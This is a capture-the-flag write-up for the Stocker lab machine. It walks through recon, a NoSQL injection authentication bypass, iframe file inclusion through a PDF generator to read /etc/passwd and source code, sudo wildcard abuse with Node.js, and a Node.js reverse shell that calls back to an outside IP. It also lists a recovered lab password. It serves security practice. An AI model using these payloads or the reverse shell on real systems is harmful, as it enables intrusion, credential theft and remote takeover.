### Host: 10.10.11.196

### Content

- NoSQL Injection
- Local File Inclusion through iframe
- NodeJS wildcard abuse

### Reconnaissance

Initial reconnaissance for TCP ports

```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.11.196
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.196 ()   Status: Up
Host: 10.10.11.196 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Services and Versions running:

```bash
nmap -p22,80 -sCV -Pn -n -oN targeted 10.10.11.196
Nmap scan report for 10.10.11.196
Host is up (0.070s latency).
Scanned at 2023-01-23 18:13:17 EST for 9s

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Jyuj3D7FuZQdudxWlH081Q6WkdTVz6G05mFSFpBpycfOrwuJpQ6oJV1I4J6UeXg+o5xHSm+ANLhYEI6T/JMnYSyEmVq/QVactDs9ixhi+j0R0rUrYYgteX7XuOT2g4ivyp1zKQP1uKYF2lGVnrcvX4a6ds4FS8mkM2o74qeZj6XfUiCYdPSVJmFjX/TgTzXYHt7kHj0vLtMG63sxXQDVLC5NwLs3VE61qD4KmhCfu+9viOBvA1ZID4Bmw8vgi0b5FfQASbtkylpRxdOEyUxGZ1dbcJzT+wGEhalvlQl9CirZLPMBn4YMC86okK/Kc0Wv+X/lC+4UehL//U3MkD9XF3yTmq+UVF/qJTrs9Y15lUOu3bJ9kpP9VDbA6NNGi1HdLyO4CbtifsWblmmoRWIr+U8B2wP/D9whWGwRJPBBwTJWZvxvZz3llRQhq/8Np0374iHWIEG+k9U9Am6rFKBgGlPUcf6Mg7w4AFLiFEQaQFRpEbf+xtS1YMLLqpg3qB0=
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgPXCNqX65/kNxcEEVPqpV7du+KsPJokAydK/wx1GqHpuUm3lLjMuLOnGFInSYGKlCK1MLtoCX6DjVwx6nWZ5w=
|   256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDyp1s8jG+rEbfeqAQbCqJw5+Y+T17PRzOcYd+W32hF
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

By accessing to the port 80 we can see that the web page expects the hostname shocker.htb, after add it to the /etc/hosts file we can see the following web page:
![[Pasted image 20230123201858.png]]
After an exhaustive enumeration with dirsearch throws nothing interesting:
```bash
dirsearch.py -u http://stocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r

301   178B   http://stocker.htb:80/img    -> REDIRECTS TO: http://stocker.htb/img/
301   178B   http://stocker.htb:80/css    -> REDIRECTS TO: http://stocker.htb/css/
301   178B   http://stocker.htb:80/js    -> REDIRECTS TO: http://stocker.htb/js/
301   178B   http://stocker.htb:80/fonts    -> REDIRECTS TO: http://stocker.htb/fonts/
```
Proceeding to fuzz by subdomains with wfuzz:
```bash
wfuzz -c -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.stocker.htb' --hc 301 
Target: http://stocker.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"
```
An interesting subdomain called dev is to be found and it redirects to /login:
![[Pasted image 20230123202634.png]]
After several web exploitation we find out that this web is vulnerable to NoSQL Injection, with the following request we can bypass the authentication:
```bash
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwLoT2Uj1rAHgU60MB5c2irg%2F3Vpk
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```
Keep in mind that the Content-Type has been changed to application/json so the payload can work.
After that we can access to the /stock endpoint:
![[Pasted image 20230123204126.png]]
If we capture a request while ordering something we get the following JSON:
```bash
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 235
Connection: close
Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwLoT2Uj1rAHgU60MB5c2irg%2F3Vpk

{"basket":[{"_id":"638f116eeb060210cbd83a20","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
This request generates a pdf which retrieves the order on it:
![[Pasted image 20230123204838.png]]
While trying to generate a pdf with some useful information we tried the following payload: ^ab97bc
```bash
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 199
Connection: close
Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwLoT2Uj1rAHgU60MB5c2irg%2F3Vpk

{"basket":[{"_id":"638f116eeb060210cbd83a20","title":"<iframe src=file:///etc/passwd></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
The following is retrieved:
![[Pasted image 20230123205001.png]]

### Exploitation
In order to exploit this LFI we can adjust the iFrame as follows:
```bash
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 225
Connection: close
Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwLoT2Uj1rAHgU60MB5c2irg%2F3Vpk

{"basket":[{"_id":"638f116eeb060210cbd83a20","title":"<iframe src=file:///etc/passwd height=1000px width=800px></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
This way we can get a better view of the file:
![[Pasted image 20230123210441.png]]
After enumerating the system files, we can retrieve the index.js of the /dev subdomain:
```bash
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 235
Connection: close
Cookie: connect.sid=s%3AyGd29rDOOta_oSwfj5BOgTjQThwvLm0v.1A9F%2BB%2FN8%2FuDhxgwLoT2Uj1rAHgU60MB5c2irg%2F3Vpk

{"basket":[{"_id":"638f116eeb060210cbd83a20","title":"<iframe src=file:///var/www/dev/index.js height=1000px width=800px></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
Inside of it, there is a password:
![[Pasted image 20230123210616.png]]
Using it with ssh and user angoose we get access to the system:
```bash
ssh angoose@10.10.11.196      
angoose@10.10.11.196's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ ls
user.txt
angoose@stocker:~$ cat user.txt 
ebe2ef983e893cb359eb38b330787857
```

### Privilege Escalation
On the system there is an entry on the /etc/sudoers file: ^d64ec2
```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
We can abuse of this wildcard and create the following script to read files with nodeJS:
```bash
const fs = require('fs');

fs.readFile('/root/root.txt', 'utf-8', (err, data) =>{
        if (err) throw err;
        console.log(data);
});
```
And that gives us the root flag.

### Post Exploitation
^2cf0f4
It is also possible to get a reverse shell as root with the following nodeJS code:
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.2", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
### Credentials
```bash
angoose:IHeardPassphrasesArePrettySecure
```

### Notes

- Always try to use NoSQL Injection to try Authentication bypass
- PDF web exploitation is arise, always check if create a PDF with any vulnerability gives any result.

### References

[No-SQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)


